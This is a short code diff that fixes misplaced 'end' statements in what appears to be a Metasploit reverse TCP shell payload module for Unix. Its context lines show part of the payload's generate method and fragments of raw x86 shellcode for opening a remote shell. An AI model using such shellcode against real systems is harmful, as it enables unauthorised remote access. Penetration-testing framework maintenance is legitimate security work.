@@ -26,6 +26,7 @@ module MetasploitModule
       'Handler'       => Msf::Handler::ReverseTcp,
       'Session'       => Msf::Sessions::CommandShellUnix
     ))
+  end
 
      def generate
           my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
@@ -49,5 +50,4 @@ module MetasploitModule
           "\xc3\x31\xdb\x53\x6a\x0a\xf7\xe3\x89\xe3\xb0\xa2\xcd\x80\xeb\x91" +
           "\xc3\x31\xc0\xb0\x01\xcd\x80"
   end
-end
 end
